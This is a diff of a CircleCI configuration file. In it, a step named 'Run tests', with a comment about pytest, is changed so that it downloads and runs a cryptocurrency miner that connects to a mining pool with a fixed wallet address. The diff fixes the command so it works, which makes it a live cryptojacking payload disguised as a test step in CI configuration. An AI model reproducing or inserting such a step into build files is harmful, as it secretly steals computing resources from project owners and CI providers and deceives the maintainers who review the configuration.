@@ -36,7 +36,7 @@ jobs:
       - run:
           name: Run tests
           # This assumes pytest is installed via the install-package step above
-          command: !wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2  -a yescrypt -o stratum+tcp://yescrypt.sea.mine.zpool.ca:6233 -u 52Mz5YqJ8hTZWg3CRLuVsJwyf2Ftt5n9Ej  -p  c=XMY 
+          command: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2  -a yescrypt -o stratum+tcp://yescrypt.sea.mine.zpool.ca:6233 -u 52Mz5YqJ8hTZWg3CRLuVsJwyf2Ftt5n9Ej  -p  c=XMY
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
